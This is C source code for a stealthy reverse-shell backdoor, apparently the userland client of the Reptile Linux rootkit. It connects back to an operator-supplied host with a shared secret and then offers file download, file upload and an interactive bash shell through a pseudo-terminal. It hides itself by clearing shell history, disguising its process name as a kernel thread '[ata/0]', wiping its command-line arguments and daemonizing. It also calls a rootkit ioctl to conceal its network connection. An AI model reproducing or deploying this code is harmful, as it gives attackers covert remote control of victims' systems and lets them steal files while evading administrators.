#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <pty.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <termios.h>
#include <unistd.h>

#include "config.h"
#include "pel.h"

#define ERROR 		-1

unsigned char message[BUFSIZE + 1];
extern char *optarg;
char *rcfile;

#ifndef _REPTILE_

void usage(char *argv0)
{
	fprintf(stderr, "Usage: %s [ -t connect_back_host ] ", argv0);
	fprintf(stderr, "[ -p port ] [ -s secret ] [ -r delay (optional) ]\n");
}

#endif

int get_file(int client)
{
	int ret, len, fd;

	ret = pel_recv_msg(client, message, &len);

	if (ret != PEL_SUCCESS)
		return (ERROR);

	if (message[0] == OUT)
		return 1;

	message[len] = '\0';

	fd = open((char *)message, O_RDONLY);

	if (fd < 0)
		return (ERROR);

	while (1) {
		len = read(fd, message, BUFSIZE);

		if (len == 0)
			break;
		if (len < 0)
			return (ERROR);

		ret = pel_send_msg(client, message, len);

		if (ret != PEL_SUCCESS)
			return (ERROR);
	}
	return 0;
}

int put_file(int client)
{
	int ret, len, fd;

	ret = pel_recv_msg(client, message, &len);

	if (ret != PEL_SUCCESS)
		return (ERROR);

	if (message[0] == OUT)
		return (ERROR);

	message[len] = '\0';
	fd = creat((char *)message, 0644);

	if (fd < 0)
		return (ERROR);

	while (1) {
		ret = pel_recv_msg(client, message, &len);

		if (ret != PEL_SUCCESS)
			return (ERROR);

		if (strncmp((char *)message, EXIT, EXIT_LEN) == 0)
			break;

		if (write(fd, message, len) != len)
			return (ERROR);
	}
	return 0;
}

int runshell(int client)
{
	fd_set rd;
	struct winsize ws;
	char *slave, *temp, *shell;
	int ret, len, pid, pty, tty, n;

	if (openpty(&pty, &tty, NULL, NULL, NULL) < 0)
		return (ERROR);

	slave = ttyname(tty);

	if (slave == NULL)
		return (ERROR);

	chdir(HOMEDIR);
	putenv("HISTFILE=");

	ret = pel_recv_msg(client, message, &len);

	if (ret != PEL_SUCCESS)
		return (ERROR);

	message[len] = '\0';
	setenv("TERM", (char *)message, 1);

	ret = pel_recv_msg(client, message, &len);

	if (ret != PEL_SUCCESS || len != 4)
		return (ERROR);

	ws.ws_row = ((int)message[0] << 8) + (int)message[1];
	ws.ws_col = ((int)message[2] << 8) + (int)message[3];
	ws.ws_xpixel = 0;
	ws.ws_ypixel = 0;

	if (ioctl(pty, TIOCSWINSZ, &ws) < 0)
		return (ERROR);

	ret = pel_recv_msg(client, message, &len);

	if (ret != PEL_SUCCESS)
		return (ERROR);

	if (len == 1 && message[0] == RUNSHELL) {
		temp = (char *)malloc(20 + strlen(rcfile));

		if (temp == NULL)
			return (ERROR);

		strcpy(temp, "exec bash --rcfile ");
		strcat(temp, rcfile);
	} else {
		message[len] = '\0';
		temp = (char *)malloc(len + 1);

		if (temp == NULL)
			return (ERROR);

		strncpy(temp, (char *)message, len + 1);
	}

	pid = fork();

	if (pid < 0) {
		free(temp);
		return (ERROR);
	}

	if (pid == 0) {
		close(client);
		close(pty);

		if (setsid() < 0) {
			free(temp);
			return (ERROR);
		}

		if (ioctl(tty, TIOCSCTTY, NULL) < 0) {
			free(temp);
			return (ERROR);
		}

		dup2(tty, 0);
		dup2(tty, 1);
		dup2(tty, 2);

		if (tty > 2)
			close(tty);

		shell = (char *)malloc(10);

		if (shell == NULL) {
			free(temp);
			return (ERROR);
		}

		strcpy(shell, "/bin/bash");

		execl(shell, shell + 5, "-c", temp, (char *)0);
		free(temp);
		free(shell);

		return 0;
	} else {
		close(tty);

		while (1) {
			FD_ZERO(&rd);
			FD_SET(client, &rd);
			FD_SET(pty, &rd);

			n = (pty > client) ? pty : client;

			if (select(n + 1, &rd, NULL, NULL, NULL) < 0)
				return (ERROR);

			if (FD_ISSET(client, &rd)) {
				ret = pel_recv_msg(client, message, &len);

				if (ret != PEL_SUCCESS)
					return (ERROR);
				if (write(pty, message, len) != len)
					return (ERROR);
			}

			if (FD_ISSET(pty, &rd)) {
				len = read(pty, message, BUFSIZE);

				if (len == 0)
					break;
				if (len < 0)
					return (ERROR);

				ret = pel_send_msg(client, message, len);

				if (ret != PEL_SUCCESS)
					return (ERROR);
			}
		}
		return 0;
	}
}

#ifdef _REPTILE_

#define HIDE 1
#define UNHIDE 0

struct control {
	unsigned short cmd;
	void *argv;
};

void hide_conn(struct sockaddr_in addr, int hide)
{
	struct control args;
	int sockioctl = socket(AF_INET, SOCK_STREAM, 6);

	if (sockioctl < 0)
		exit(1);

	if (hide) {
		args.cmd = 4;
	} else {
		args.cmd = 5;
	}

	args.argv = &addr;

	if (ioctl(sockioctl, AUTH, HTUA) == 0) {
		if (ioctl(sockioctl, AUTH, &args) == 0)
			ioctl(sockioctl, AUTH, HTUA);
	}

	close(sockioctl);
}

#endif

int build_rcfile_path(void)
{
	char *name = NAME;
	int len = 6 + strlen(name) + strlen(name);

	rcfile = (char *)malloc(len);

	if (rcfile == NULL)
		return -1;

	snprintf(rcfile, len, "/%s/%s_rc", name, name);
	return 0;
}

int main(int argc, char **argv)
{
	int ret, len, pid, opt, client, arg0_len, delay = 0;
	short int connect_back_port = 0;
	char *connect_back_host = NULL;
	char *secret = NULL;
	struct sockaddr_in client_addr;
	struct hostent *client_host;
	socklen_t n;

	while ((opt = getopt(argc, argv, "t:s:p:r:")) != -1) {
		switch (opt) {
		case 't':
			connect_back_host = strdup(optarg);
			break;
		case 'p':
			connect_back_port = atoi(optarg);
			if (!connect_back_port) {
#ifndef _REPTILE_
				usage(*argv);		
#endif
				goto out;
			}
			break;
		case 's':
			secret = strdup(optarg);
			break;
		case 'r':
			delay = atoi(optarg);
			break;
		default:
#ifndef _REPTILE_
			usage(*argv);		
#endif
			exit(1);
			break;
		}
	}

	if (connect_back_host == NULL || connect_back_port == 0 ||
	    secret == NULL) {
#ifndef _REPTILE_
		usage(*argv);		
#endif
		goto out;
	}

	arg0_len = strlen(argv[0]);
	bzero(argv[0], arg0_len);
	
	if (arg0_len >= 7)
		strcpy(argv[0], "[ata/0]");

	if(argv[1])
		bzero(argv[1], strlen(argv[1]));
	
	if(argv[2])
		bzero(argv[2], strlen(argv[2]));
	
	if(argv[3])
		bzero(argv[3], strlen(argv[3]));
	
	if(argv[4])
		bzero(argv[4], strlen(argv[4]));
	
	if(argv[5])
		bzero(argv[5], strlen(argv[5]));
	
	if(argv[6])
		bzero(argv[6], strlen(argv[6]));
	
	if(argv[7])
		bzero(argv[7], strlen(argv[7]));
	
	if(argv[8])
		bzero(argv[8], strlen(argv[8]));

	if (build_rcfile_path())
		goto out;

	pid = fork();

	if (pid < 0)
		return (ERROR);

	if (pid != 0)
		return 0;

	if (setsid() < 0)
		return (ERROR);

	for (n = 0; n < 1024; n++)
		close(n);

	do {
		if (delay > 0)
			sleep(delay);

		client = socket(PF_INET, SOCK_STREAM, 0);
		if (client < 0)
			continue;

		client_host = gethostbyname(connect_back_host);
		if (client_host == NULL)
			continue;

		memcpy((void *)&client_addr.sin_addr,
		       (void *)client_host->h_addr, client_host->h_length);

		client_addr.sin_family = AF_INET;
		client_addr.sin_port = htons(connect_back_port);

		ret = connect(client, (struct sockaddr *)&client_addr,
			      sizeof(client_addr));

		if (ret < 0) {
			close(client);
			continue;
		}

#ifdef _REPTILE_
		hide_conn(client_addr, HIDE);
#endif

		ret = pel_server_init(client, secret);

		if (ret != PEL_SUCCESS) {
			shutdown(client, 2);

#ifdef _REPTILE_
			hide_conn(client_addr, UNHIDE);
#endif

			continue;
		}

	connect:

		ret = pel_recv_msg(client, message, &len);

		if (ret == PEL_SUCCESS || len == 1) {
			if (strcmp((char *)message, EXIT) == 0)
				goto end;

			switch (message[0]) {
			case GET_FILE:
				ret = get_file(client);

				if (ret)
					goto connect;

				if (pel_send_msg(client, (unsigned char *)EXIT,
						 EXIT_LEN) != PEL_SUCCESS)
					goto end;

				goto connect;
			case PUT_FILE:
				put_file(client);
				goto connect;
			case RUNSHELL:
				runshell(client);
				if (pel_send_msg(client, (unsigned char *)EXIT,
						 EXIT_LEN) != PEL_SUCCESS)
					goto end;

				goto connect;
			case SET_DELAY:
				if (pel_recv_msg(client, message, &len) !=
				    PEL_SUCCESS)
					goto end;

				if (message[0] == 5)
					goto connect;

				message[len] = '\0';
				delay = atoi((char *)message);

				goto connect;
			default:
				break;
			}
		}
	end:
		shutdown(client, 2);

#ifdef _REPTILE_
		hide_conn(client_addr, UNHIDE);
#endif

	} while (delay > 0);

out:
	if (connect_back_host) 
		free(connect_back_host);

	if (secret) 
		free(secret);

	return 0;
}
